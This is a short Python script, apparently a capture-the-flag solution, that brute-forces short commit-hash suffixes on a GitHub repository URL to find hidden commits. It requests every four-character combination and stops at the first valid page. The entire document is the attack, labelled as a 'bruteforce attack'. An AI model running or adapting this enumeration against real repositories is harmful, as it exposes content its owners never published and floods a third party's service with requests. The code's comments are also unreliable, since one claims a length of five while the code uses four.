import requests
import itertools
import string

# URL pattern with placeholder for bruteforcing
url_pattern = "https://github.com/notevilcorp/tools/commit/4b{}"

# Possible characters for bruteforce (alphanumeric)
characters = string.ascii_lowercase + string.digits

# Brute force length (in this case, assuming 5 characters)
length = 4

# Function to try URLs and check if status code is 200
def bruteforce_url():
    for combination in itertools.product(characters, repeat=length):
        test_string = ''.join(combination)
        test_url = url_pattern.format(test_string)
        try:
            response = requests.get(test_url)
            if response.status_code == 200:
                print(f"Success! URL exists: {test_url}")
                break  # Stop once a valid URL is found
            else:
                print(f"Failed: {test_url} with status code {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e} for {test_url}")

# Start bruteforce attack
bruteforce_url()
